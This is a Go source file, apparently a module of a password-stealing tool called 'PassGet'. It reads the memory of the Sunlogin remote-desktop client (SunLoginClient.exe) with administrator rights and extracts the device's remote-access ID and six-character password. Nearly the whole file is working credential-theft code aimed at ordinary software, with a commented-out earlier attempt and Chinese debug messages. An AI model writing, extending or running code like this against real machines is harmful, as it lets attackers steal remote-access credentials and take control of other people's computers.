package sunlogin

import (
	"PassGet/modules/utils"
	"PassGet/modules/utils/remote"
	"fmt"
	"golang.org/x/sys/windows"
	"strconv"
	"strings"
)

type Client struct {
	ID          string
	Pass        string
	InstallPath string
	ProcName    string
	ProcId      string
	procs       []utils.Proc
}

func Get() *Client {
	C := new(Client)
	if utils.CheckIsAdmin() {
		C.procs = remote.GetProcessList("SunLoginClient.exe")
		if C.procs != nil {
			C.GetFromProcess()
		}
		if C.ID != "" && C.Pass != "" {
			return C
		}
		fmt.Println("Get From Process Failed.")
	}
	return nil
}
func (C *Client) GetFromProcess() {
	for _, proc := range C.procs {
		handle, err := remote.OpenProcess(proc.PID)
		if err != nil {
			continue
		}
		defer windows.CloseHandle(handle)

		pattern := []byte("<f f=yahei.28 c=color_edit >")
		//pattern := []byte(`<f f=yahei.28 c=color_edit >.*</f>`)
		IDs, _, err := remote.SearchMemory(handle, pattern, false)
		if err != nil {
			continue
		}
		if len(IDs) >= 17 {
			for _, id := range IDs {
				data, err := remote.ReadMemory(handle, id, 900)
				if err != nil {
					continue
				}

				remoteCode := remote.ExtractBetween(string(data), ">", "</f>")
				if remote.IsNumeric(strings.ReplaceAll(remoteCode, " ", "")) {
					C.ID = remoteCode
					break
				}
			}
		}
		for _, addr := range IDs {
			data, err := remote.ReadMemory(handle, addr, 900)
			if err != nil {
				fmt.Printf("读取内存失败: %v\n", err)
				continue
			}

			password := remote.ExtractBetween(string(data), ">", "</f>")
			if len(password) == 6 {
				C.Pass = password
				break
			}
		}
		//passwordPattern := []byte("<f f=yahei.28 c=color_edit >")
		//passwordArray, _, err := remote.SearchMemory(handle, passwordPattern, false)
		//if err != nil {
		//	continue
		//}
		//if len(passwordArray) >= 9 {
		//	for _, addr := range passwordArray {
		//		data, err := remote.ReadMemory(handle, addr, 900)
		//		if err != nil {
		//			fmt.Printf("读取内存失败: %v\n", err)
		//			continue
		//		}
		//
		//		password := remote.ExtractBetween(string(data), ">", "</f>")
		//		if len(password) == 6 {
		//			C.Pass = password
		//			break
		//		}
		//	}
		//}
		if C.ID != "" && C.Pass != "" {
			C.InstallPath = proc.Path
			C.ProcName = proc.Name
			C.ProcId = strconv.Itoa(int(proc.PID))
			return
		}
	}
}
